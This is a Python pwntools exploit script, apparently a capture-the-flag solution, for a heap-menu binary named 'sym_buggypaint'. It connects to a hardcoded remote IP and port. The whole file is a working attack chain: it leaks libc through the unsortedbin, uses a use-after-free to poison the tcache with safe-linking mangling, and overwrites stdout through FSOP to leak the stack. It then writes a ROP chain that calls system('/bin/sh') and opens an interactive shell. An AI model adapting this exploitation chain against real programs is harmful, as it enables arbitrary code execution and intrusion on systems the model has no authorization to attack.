#!/usr/bin/env python3

# type: ignore
# flake8: noqa

from pwn import *

elf = context.binary = ELF("./sym_buggypaint", checksec=False)
libc = elf.libc


def start(argv=[], *a, **kw):
    nc = "nc 3.75.185.198 2000"
    nc = nc.split()
    host = args.HOST or nc[1]
    port = int(args.PORT or nc[2])
    if args.REMOTE:
        return remote(host, port)
    else:
        args_ = [elf.path] + argv
        if args.NA:  # NOASLR
            args_ = ["setarch", "-R"] + args_
        return process(args_, env=env, *a, **kw)


def create(x, y, w, h, content, color=1, force=False):
    io.sendlineafter(b"> ", b"1")
    io.sendlineafter(b"x: ", str(x).encode())
    io.sendlineafter(b"y: ", str(y).encode())
    io.sendlineafter(b"width: ", str(w).encode())
    io.sendlineafter(b"height: ", str(h).encode())
    io.sendlineafter(b"color(1=red, 2=green): ", str(color).encode())
    if not force:
        io.sendafter(b"content: ", content)
    else:
        time.sleep(0.1)
        io.send(content)


def delete(x, y):
    io.sendlineafter(b"> ", b"2")
    io.sendlineafter(b"x: ", str(x).encode())
    io.sendlineafter(b"y: ", str(y).encode())


def select(x, y):
    io.sendlineafter(b"> ", b"3")
    io.sendlineafter(b"x: ", str(x).encode())
    io.sendlineafter(b"y: ", str(y).encode())


def edit(content):
    io.sendlineafter(b"> ", b"4")
    io.sendafter(b"New content: ", content)


def show():
    io.sendlineafter(b"> ", b"5")
    io.recvuntil(b"Box content:\n")
    content = io.recvuntil(b"==================================", drop=True)
    return content


def mangle(pos, ptr):
    return (pos >> 12) ^ ptr


env = {}
io = start()

create(0, 0, 0x18, 0x18, b"huge")
create(0, 1, 0x18, 0x18, b"huge")
create(0, 2, 0x18, 0x18, b"huge")
create(0, 3, 0x18, 0x18, b"huge")
create(0, 4, 0x18, 0x18, b"huge")
create(0, 5, 0x18, 0x18, b"huge")
create(0, 6, 0x18, 0x18, b"huge")
create(0, 7, 0x18, 0x18, b"huge")  # this one goes into unsortedbin
create(0, 8, 1, 1, b"a")  # prevent consolidation

select(0, 7)
# fill tcachebins
for i in range(8):
    delete(0, i)


leak = show()
# libc leak from unsortedbin
libc_leak = u64(leak[:8])
libc.address = libc_leak - 0x219ce0
log.info(f"{libc.address=:#x}")

# UAF to tcache poisoning
create(8, 8, 8, 10, b"1337")
create(9, 9, 8, 10, b"1337")
select(8, 8)
delete(8, 8)
leak = show()
heap = (u64(leak[:8]) - 1) << 12
log.info(f"{heap=:#x}")
select(9, 9)
delete(9, 9)
leak_stack_addr = libc.address + 0x21aa20
payload = p64(mangle(heap + 0x1000, libc.sym["_IO_2_1_stdout_"]))
edit(payload)

# tcache poisoning to perform abritrary chunk allocation at _IO_2_1_stdout_
# and do FSOP abritrary read to leak the stack
create(8, 8, 8, 10, b"1337")
fs = FileStructure()
payload = bytearray(fs.write(addr=leak_stack_addr, size=0x10))
payload[:4] = p32(0xfbad2886)
create(9, 9, 8, 10, payload[:80], force=True)

stack_leak = u64(io.recv(8))
log.info(f"{stack_leak=:#x}")

pop_rdi = libc.address + 0x001bc0a1
system = libc.sym["system"]
binsh_str = next(libc.search(b"/bin/sh\x00"))
ropchain = flat(
    libc.address + 0x219000 + 0x1c00,
    pop_rdi, binsh_str,
    pop_rdi + 1,
    system
)

create(2, 0, 8, 10, b"deadbeef")
create(2, 1, 8, 10, b"deadbeef")
delete(2, 0)
select(2, 1)
delete(2, 1)
payload = p64(mangle(heap + 0x1000, stack_leak - 0x138))
edit(payload)
create(2, 0, 8, 10, b"deadbeef")
create(2, 1, 8, 10, ropchain)

io.interactive()
